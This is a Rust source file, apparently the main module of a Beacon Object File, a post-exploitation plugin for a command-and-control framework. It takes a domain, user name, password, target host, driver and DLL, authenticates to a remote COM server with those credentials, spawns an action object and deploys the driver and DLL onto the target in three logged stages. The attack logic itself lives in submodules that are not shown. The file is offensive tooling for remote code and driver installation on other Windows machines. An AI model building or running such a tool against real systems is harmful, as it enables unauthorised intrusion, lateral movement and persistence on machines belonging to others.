#![no_std]

mod argv;
mod deploy;
mod secure;
mod stage;
mod vtbl;

use rustbof::{eprintln, println};
use windows_sys::Win32::System::Com::CoUninitialize;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let Some(a) = argv::parse(args, len) else { return };
    let mut bundle = secure::build(a.domain, a.user, a.pass);
    secure::bind_identity(&mut bundle);
    unsafe {
        let srv = match stage::open_server(&bundle, a.host) {
            Ok(p) => p,
            Err(hr) => { eprintln!("stage1 rc=0x{:08X}", hr as u32); CoUninitialize(); return; }
        };
        println!("stage1 auth ok @{:p}", srv);
        let act = match stage::spawn_action(srv, &bundle) {
            Ok(p) => p,
            Err(hr) => {
                eprintln!("stage2 rc=0x{:08X}", hr as u32);
                ((*(*srv).lpVtbl).Release)(srv); CoUninitialize(); return;
            }
        };
        println!("stage2 ok @{:p}", act);
        if let Err(hr) = deploy::run(act, a.driver, a.dll) {
            eprintln!("stage3 rc=0x{:08X}", hr as u32);
        } else {
            println!("done");
        }
        ((*(*act).lpVtbl).base.Release)(act as *mut vtbl::IUnknown);
        ((*(*srv).lpVtbl).Release)(srv);
        CoUninitialize();
    }
}
